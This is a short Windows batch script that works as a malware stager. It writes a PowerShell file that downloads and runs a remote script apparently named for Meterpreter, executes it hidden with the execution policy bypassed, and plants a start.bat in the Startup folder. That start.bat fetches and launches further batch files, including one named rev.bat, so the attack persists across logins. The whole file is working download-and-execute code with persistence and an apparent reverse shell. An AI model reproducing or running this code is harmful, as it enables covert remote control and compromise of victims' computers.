@echo off
:loop
    if not exist "%temp%\sh.ps1" (
        echo IEX ^(New-Object System.Net.WebClient^).DownloadString^('https://raw.githubusercontent.com/0x2034/meterpreter/main/meter.ps1'^) >> "%temp%\sh.ps1"
    )
    powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh.ps1"
    :check_start_bat
    if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" (
        echo @echo off > "%temp%\start.bat"
        echo curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat" >> "%temp%\start.bat"
        echo powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nihbtdtdow.bat\" -WindowStyle Hidden" >> "%temp%\start.bat"
        echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" >> "%temp%\start.bat"
        move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" 
    )
    timeout /t 7 /nobreak >nul
    goto check_start_bat
timeout /t 300 /nobreak >nul
goto loop
